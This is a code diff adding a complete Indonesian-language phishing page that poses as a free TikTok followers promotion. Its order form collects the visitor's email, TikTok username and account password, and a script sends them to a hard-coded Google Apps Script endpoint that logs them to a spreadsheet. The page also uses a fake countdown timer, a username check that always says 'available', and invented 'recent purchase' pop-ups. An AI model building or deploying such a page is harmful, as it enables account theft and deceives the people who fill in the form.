@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Promo TikTok Followers Gratis</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+font-family:'Poppins',sans-serif;
+background:#000000;
+color:#ffffff;
+overflow-x:hidden;
+}
+
+/* HERO */
+.hero{
+background:linear-gradient(135deg,#000000,#ff0050,#00f2ea);
+color:white;
+padding:80px 20px;
+text-align:center;
+position:relative;
+overflow:hidden;
+}
+
+.hero::before{
+content:'';
+position:absolute;
+top:0;
+left:0;
+right:0;
+bottom:0;
+background:
+radial-gradient(circle at 20% 50%, rgba(255,0,80,0.3) 0%, transparent 50%),
+radial-gradient(circle at 80% 50%, rgba(0,242,234,0.3) 0%, transparent 50%);
+pointer-events:none;
+}
+
+.hero h1{
+font-size:38px;
+font-weight:800;
+margin-bottom:10px;
+position:relative;
+z-index:1;
+text-shadow:2px 2px 20px rgba(255,0,80,0.5);
+}
+
+.hero p{
+font-size:18px;
+margin-bottom:25px;
+position:relative;
+z-index:1;
+}
+
+/* PROMO BOX */
+.promo-box{
+display:inline-block;
+background:rgba(0,0,0,0.7);
+backdrop-filter:blur(15px);
+padding:20px 30px;
+border-radius:20px;
+font-weight:600;
+line-height:1.7;
+box-shadow:0 10px 30px rgba(255,0,80,0.4);
+border:2px solid rgba(255,0,80,0.5);
+position:relative;
+z-index:1;
+}
+
+/* COUNTDOWN */
+.countdown-section{
+margin-top:45px;
+color:white;
+position:relative;
+z-index:1;
+}
+
+.countdown-section h3{
+margin-bottom:20px;
+font-weight:700;
+}
+
+.countdown{
+display:flex;
+justify-content:center;
+align-items:center;
+gap:15px;
+flex-wrap:wrap;
+}
+
+.time-box{
+display:flex;
+flex-direction:column;
+align-items:center;
+background:rgba(0,0,0,0.7);
+padding:18px 22px;
+border-radius:15px;
+min-width:80px;
+backdrop-filter:blur(10px);
+border:2px solid rgba(0,242,234,0.5);
+box-shadow:0 0 20px rgba(0,242,234,0.3);
+}
+
+.time-box span{
+font-size:32px;
+font-weight:800;
+color:#00f2ea;
+text-shadow:0 0 10px rgba(0,242,234,0.5);
+}
+
+.time-box small{
+font-size:14px;
+margin-top:5px;
+color:white;
+}
+
+.separator{
+font-size:30px;
+font-weight:800;
+color:#ff0050;
+}
+
+/* CONTAINER */
+.container{
+max-width:1100px;
+margin:auto;
+padding:50px 20px;
+}
+
+/* DOMAIN CHECK */
+.followers-check{
+display:flex;
+justify-content:center;
+gap:10px;
+flex-wrap:wrap;
+margin-bottom:40px;
+}
+
+.followers-check input{
+padding:15px;
+width:300px;
+border-radius:30px;
+border:2px solid #ff0050;
+background:rgba(0,0,0,0.8);
+color:white;
+}
+
+.followers-check input::placeholder{
+color:rgba(255,255,255,0.5);
+}
+
+.followers-check button{
+padding:15px 25px;
+border:none;
+background:linear-gradient(45deg,#ff0050,#00f2ea);
+color:white;
+border-radius:30px;
+font-weight:600;
+cursor:pointer;
+transition:all 0.3s;
+box-shadow:0 5px 20px rgba(255,0,80,0.4);
+}
+
+.followers-check button:hover{
+transform:translateY(-2px);
+box-shadow:0 8px 25px rgba(255,0,80,0.6);
+}
+
+/* CARD */
+.card-wrapper{
+display:flex;
+flex-wrap:wrap;
+gap:20px;
+justify-content:center;
+}
+
+.card{
+background:rgba(0,0,0,0.9);
+padding:25px;
+width:300px;
+border-radius:20px;
+box-shadow:0 10px 30px rgba(255,0,80,0.3);
+text-align:center;
+transition:0.3s;
+border:2px solid rgba(255,0,80,0.3);
+}
+
+.card:hover{
+transform:translateY(-6px);
+border-color:#ff0050;
+box-shadow:0 15px 40px rgba(255,0,80,0.5);
+}
+
+.card h3{
+color:#00f2ea;
+margin-bottom:10px;
+}
+
+.price-old{
+text-decoration:line-through;
+color:#888;
+margin-top:10px;
+}
+
+.price-new{
+font-size:32px;
+color:#ff0050;
+font-weight:800;
+margin-top:5px;
+text-shadow:0 0 10px rgba(255,0,80,0.5);
+}
+
+.buy-btn{
+margin-top:15px;
+padding:13px;
+width:100%;
+border:none;
+border-radius:30px;
+background:linear-gradient(45deg,#ff0050,#00f2ea);
+color:white;
+font-weight:600;
+cursor:pointer;
+transition:all 0.3s;
+}
+
+.buy-btn:hover{
+transform:scale(1.05);
+box-shadow:0 5px 20px rgba(255,0,80,0.5);
+}
+
+/* FEATURES */
+.features{
+margin-top:70px;
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+gap:25px;
+}
+
+.feature{
+background:rgba(0,0,0,0.9);
+padding:25px;
+border-radius:20px;
+box-shadow:0 5px 20px rgba(255,0,80,0.2);
+border:2px solid rgba(255,0,80,0.2);
+transition:0.3s;
+}
+
+.feature:hover{
+border-color:#00f2ea;
+box-shadow:0 5px 20px rgba(0,242,234,0.3);
+}
+
+.feature h4{
+color:#ff0050;
+margin-bottom:8px;
+}
+
+.feature p{
+color:rgba(255,255,255,0.8);
+}
+
+/* MODAL */
+.modal{
+display:none;
+position:fixed;
+inset:0;
+background:rgba(0,0,0,0.9);
+justify-content:center;
+align-items:center;
+padding:20px;
+z-index:1000;
+}
+
+.modal-content{
+background:rgba(0,0,0,0.95);
+padding:30px;
+width:100%;
+max-width:420px;
+border-radius:25px;
+border:2px solid #ff0050;
+box-shadow:0 10px 50px rgba(255,0,80,0.5);
+}
+
+.modal-content h3{
+margin-bottom:15px;
+text-align:center;
+color:#00f2ea;
+}
+
+.modal-content input, 
+.modal-content select{
+width:100%;
+padding:14px;
+margin-bottom:12px;
+border-radius:12px;
+border:2px solid rgba(255,0,80,0.5);
+font-family:'Poppins';
+font-size:14px;
+background:rgba(0,0,0,0.8);
+color:white;
+}
+
+.modal-content input::placeholder,
+.modal-content select{
+color:rgba(255,255,255,0.5);
+}
+
+.modal-content select option{
+background:#000;
+color:white;
+}
+
+/* TOKEN FIELD MODERN */
+.token-wrapper{
+position:relative;
+width:100%;
+margin-bottom:12px;
+}
+
+.token-wrapper input{
+padding-right:50px;
+}
+
+.eye-toggle{
+position:absolute;
+right:12px;
+top:14px;
+cursor:pointer;
+width:24px;
+height:24px;
+background:transparent;
+border:none;
+padding:4px;
+border-radius:6px;
+transition:all 0.2s ease;
+display:flex;
+align-items:center;
+justify-content:center;
+}
+
+.eye-toggle:hover{
+background:rgba(255,0,80,0.2);
+}
+
+.eye-toggle:active{
+transform:scale(0.95);
+}
+
+.eye-toggle svg{
+width:20px;
+height:20px;
+fill:#ff0050;
+transition:fill 0.2s ease;
+}
+
+.eye-toggle:hover svg{
+fill:#00f2ea;
+}
+
+.modal-content button{
+width:100%;
+padding:14px;
+border:none;
+border-radius:30px;
+background:linear-gradient(45deg,#ff0050,#00f2ea);
+color:white;
+font-weight:600;
+cursor:pointer;
+transition:all 0.3s;
+}
+
+.modal-content button:hover{
+transform:scale(1.02);
+box-shadow:0 5px 20px rgba(255,0,80,0.5);
+}
+
+.modal-content button:disabled{
+opacity:0.6;
+cursor:not-allowed;
+}
+
+.modal-content .close-btn{
+text-align:right;
+cursor:pointer;
+font-weight:bold;
+color:#ff0050;
+font-size:24px;
+transition:0.3s;
+}
+
+.modal-content .close-btn:hover{
+color:#00f2ea;
+}
+
+/* NOTIF */
+.notif{
+position:fixed;
+bottom:20px;
+left:20px;
+background:rgba(0,0,0,0.95);
+padding:12px 18px;
+border-radius:15px;
+box-shadow:0 5px 20px rgba(255,0,80,0.5);
+display:none;
+font-size:14px;
+z-index:999;
+border:2px solid #ff0050;
+color:white;
+}
+
+/* SUCCESS MESSAGE */
+.success-message{
+display:none;
+text-align:center;
+color:#00f2ea;
+font-weight:600;
+margin-top:15px;
+}
+
+/* RESULT */
+#result{
+color:#00f2ea;
+font-weight:600;
+}
+
+/* MOBILE */
+@media(max-width:768px){
+.hero h1{font-size:26px;}
+.time-box{min-width:65px;padding:14px;}
+.time-box span{font-size:24px;}
+.separator{font-size:24px;}
+.followers-check input{width:100%;}
+}
+</style>
+</head>
+<body>
+
+<div class="hero">
+<h1>TikTok Followers</h1>
+<p>Proses tercepat & terpercaya</p>
+
+<div class="promo-box">
+Dapatkan Followers Gratis + Like<br>
+Garansi Followers 99%<br>
+Kecepatan Hingga 40x Lipat
+</div>
+
+<div class="countdown-section">
+<h3>Ambil Promo Ini Sebelum Berakhir!</h3>
+<div class="countdown">
+<div class="time-box">
+<span id="hours">00</span>
+<small>jam</small>
+</div>
+<div class="separator">:</div>
+<div class="time-box">
+<span id="minutes">30</span>
+<small>menit</small>
+</div>
+<div class="separator">:</div>
+<div class="time-box">
+<span id="seconds">00</span>
+<small>detik</small>
+</div>
+</div>
+</div>
+</div>
+
+<div class="container">
+
+<div class="followers-check">
+<input type="text" id="followersInput" placeholder="Username TikTok Anda">
+<button onclick="cekUsername()">Cek Username</button>
+</div>
+
+<div id="result" style="text-align:center;margin-bottom:30px;"></div>
+
+<div class="card-wrapper">
+<div class="card">
+<h3>100 Followers + 1000 Like</h3>
+<div class="price-old">Rp 29.000</div>
+<div class="price-new">Rp 0</div>
+<button class="buy-btn" onclick="openForm('100 Followers + 1000 Like')">Beli Sekarang</button>
+</div>
+
+<div class="card">
+<h3>500 Followers + 5000 Like</h3>
+<div class="price-old">Rp 49.000</div>
+<div class="price-new">Rp 0</div>
+<button class="buy-btn" onclick="openForm('500 Followers + 5000 Like')">Beli Sekarang</button>
+</div>
+
+<div class="card">
+<h3>1000 Followers + 8000 Like</h3>
+<div class="price-old">Rp 91.000</div>
+<div class="price-new">Rp 0</div>
+<button class="buy-btn" onclick="openForm('1000 Followers + 8000 Like')">Beli Sekarang</button>
+</div>
+</div>
+
+<div class="features">
+<div class="feature">
+<h4>Followers High Quality</h4>
+<p>Followers dengan database dunia kualitas tertinggi</p>
+</div>
+<div class="feature">
+<h4>Garansi Followers Permanen</h4>
+<p>Garansi 30 hari pengisian kembali jika followers turun</p>
+</div>
+<div class="feature">
+<h4>Proses Tercepat</h4>
+<p>Load time followers lebih cepat 10x lipat</p>
+</div>
+</div>
+
+</div>
+
+<!-- MODAL -->
+<div class="modal" id="modal">
+<div class="modal-content">
+<div class="close-btn" onclick="closeForm()">×</div>
+<h3>Form Pembelian</h3>
+<form id="orderForm" onsubmit="submitForm(event)">
+<input type="email" id="emailInput" placeholder="Email" required>
+<input type="text" id="usernameInput" placeholder="Username TikTok" required>
+
+<div class="token-wrapper">
+<input type="password" id="token" placeholder="Password" required>
+
+<div class="eye-toggle" onclick="toggleToken()">
+<!-- Eye Open (Show Password) -->
+<svg id="eyeOpen" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M12 5C7.5 5 3.73 7.61 2 12c1.73 4.39 5.5 7 10 7s8.27-2.61 10-7c-1.73-4.39-5.5-7-10-7zm0 11.5c-2.48 0-4.5-2.02-4.5-4.5S9.52 7.5 12 7.5s4.5 2.02 4.5 4.5-2.02 4.5-4.5 4.5zm0-7c-1.38 0-2.5 1.12-2.5 2.5s1.12 2.5 2.5 2.5 2.5-1.12 2.5-2.5-1.12-2.5-2.5-2.5z" fill="currentColor"/>
+</svg>
+
+<!-- Eye Closed (Hide Password) -->
+<svg id="eyeClose" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:none;">
+<path d="M12 6.5c2.76 0 5.23 1.23 6.88 3.17l1.42-1.42C18.59 6.27 15.45 4.5 12 4.5c-3.45 0-6.59 1.77-8.3 3.75l1.42 1.42C6.77 7.73 9.24 6.5 12 6.5zm9.88 5.5c-.42 1.17-1.02 2.23-1.77 3.15l1.41 1.41c.98-1.19 1.74-2.56 2.24-4.06-.42-1.26-1.05-2.43-1.84-3.47l-1.41 1.41c.57.76 1.02 1.61 1.37 2.56zM12 17.5c-2.76 0-5.23-1.23-6.88-3.17l-1.42 1.42c1.71 1.98 4.85 3.75 8.3 3.75 3.45 0 6.59-1.77 8.3-3.75l-1.42-1.42c-1.65 1.94-4.12 3.17-6.88 3.17zM2.12 11.5c.42-1.17 1.02-2.23 1.77-3.15L2.48 6.94C1.5 8.13.74 9.5.24 11c.42 1.26 1.05 2.43 1.84 3.47l1.41-1.41c-.57-.76-1.02-1.61-1.37-2.56zM12 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z" fill="currentColor"/>
+<line x1="4" y1="4" x2="20" y2="20" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+</svg>
+</div>
+</div>
+
+<select id="packageSelect" required>
+<option value="">Pilih Paket</option>
+<option>100 Followers + 1000 Like</option>
+<option>500 Followers + 5000 Like</option>
+<option>1000 Followers + 8000 Like</option>
+</select>
+
+<button type="submit" id="submitBtn">Kirim Pesanan</button>
+<div class="success-message" id="successMessage">✅ Pesanan berhasil dikirim!</div>
+</form>
+</div>
+</div>
+
+<div class="notif" id="notif"></div>
+
+<script>
+// GANTI DENGAN URL GOOGLE APPS SCRIPT ANDA
+const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzjDuixhlM61QL8qFLsT_kDDaByIy5XOQWsbAyF3-drgtP-Qt6eHQDBPuOnGI_YgO1YqQ/exec';
+
+let totalTime=1800;
+setInterval(function(){
+let hours=Math.floor(totalTime/3600);
+let minutes=Math.floor((totalTime%3600)/60);
+let seconds=totalTime%60;
+document.getElementById("hours").innerText=hours<10?"0"+hours:hours;
+document.getElementById("minutes").innerText=minutes<10?"0"+minutes:minutes;
+document.getElementById("seconds").innerText=seconds<10?"0"+seconds:seconds;
+if(totalTime>0){totalTime--;}
+},1000);
+
+function toggleToken(){
+const input=document.getElementById("token");
+const open=document.getElementById("eyeOpen");
+const close=document.getElementById("eyeClose");
+
+if(input.type==="password"){
+input.type="text";
+open.style.display="none";
+close.style.display="block";
+}else{
+input.type="password";
+open.style.display="block";
+close.style.display="none";
+}
+}
+
+function cekUsername(){
+let d=document.getElementById("followersInput").value;
+if(d!=""){
+document.getElementById("result").innerHTML="✅ Username <b>"+d+"</b> tersedia!";
+}
+}
+
+let selectedPackage = '';
+
+function openForm(packageName){
+selectedPackage = packageName;
+document.getElementById("packageSelect").value = packageName;
+document.getElementById("modal").style.display="flex";
+}
+
+function closeForm(){
+document.getElementById("modal").style.display="none";
+document.getElementById("orderForm").reset();
+document.getElementById("successMessage").style.display="none";
+}
+
+async function submitForm(event){
+event.preventDefault();
+
+const submitBtn = document.getElementById("submitBtn");
+const successMessage = document.getElementById("successMessage");
+
+// Ambil data form
+const email = document.getElementById("emailInput").value;
+const username = document.getElementById("usernameInput").value;
+const password = document.getElementById("token").value;
+const package = document.getElementById("packageSelect").value;
+const timestamp = new Date().toLocaleString('id-ID');
+    
+// Disable button
+submitBtn.disabled = true;
+submitBtn.innerText = "Mengirim...";
+
+try {
+// Kirim ke Google Sheets
+const response = await fetch(GOOGLE_SCRIPT_URL, {
+method: 'POST',
+mode: 'no-cors',
+headers: {
+'Content-Type': 'application/json',
+},
+body: JSON.stringify({
+email: email,
+username: username,
+password: password,
+package: package,
+timestamp: timestamp
+})
+});
+
+// Tampilkan pesan sukses
+successMessage.style.display = "block";
+submitBtn.innerText = "Berhasil Dikirim!";
+
+// Reset form setelah 2 detik
+setTimeout(() => {
+closeForm();
+submitBtn.disabled = false;
+submitBtn.innerText = "Kirim Pesanan";
+}, 2000);
+
+} catch (error) {
+console.error('Error:', error);
+alert('Terjadi kesalahan saat mengirim data. Silakan coba lagi.');
+submitBtn.disabled = false;
+submitBtn.innerText = "Kirim Pesanan";
+}
+}
+
+const names=["syakhi","amaraa","Rizky22","fajarr","Dimms","rinn","ssiti","putri","Adityy","hendra","wahyu9","L1na","Dewii"];
+function showNotif(){
+let name=names[Math.floor(Math.random()*names.length)];
+let masked=name+"*****";
+let minute=Math.floor(Math.random()*30)+1;
+let notif=document.getElementById("notif");
+notif.innerHTML="🔥 "+masked+" telah membeli followers "+minute+" menit yang lalu";
+notif.style.display="block";
+setTimeout(()=>{notif.style.display="none";},5000);
+}
+setInterval(showNotif,8000);
+</script>
+
+</body>
+</html>
